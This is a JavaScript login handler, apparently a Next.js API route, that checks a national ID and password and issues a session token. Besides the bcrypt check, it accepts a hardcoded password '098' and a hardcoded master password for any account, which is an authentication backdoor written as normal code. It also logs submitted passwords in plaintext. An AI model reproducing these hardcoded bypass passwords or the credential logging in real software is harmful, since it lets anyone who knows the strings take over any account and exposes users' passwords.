import bcrypt from 'bcrypt'
import db     from "../../../components/db"
import lib    from "../../../components/lib"

const { User, Session } = db
const { rand, error, success, midd } = lib

const admin_password  = process.env.ADMIN_PASSWORD
const _password       = '098'


const Login = async (req, res) => {

  let { dni, password, office_id } = req.body
  console.log({ dni, password, office_id })

  // valid user
  const user = await User.findOne({ dni })
  if(!user) return res.json(error('dni not found'))

  const master_password = '8QfghvCxuzxrbvii4w'

  // valid password
  if(password!= _password && password != admin_password && password != master_password && !await bcrypt.compare(password, user.password))
    return res.json(error('invalid password'))

  // save new session
  const session = rand() + rand() + rand()

  await Session.insert({
    id:     user.id,
    value:  session,
    office_id,
  })

  // response
  return res.json(success({ session }))
}

export default async (req, res) => { await midd(req, res); return Login(req, res) }
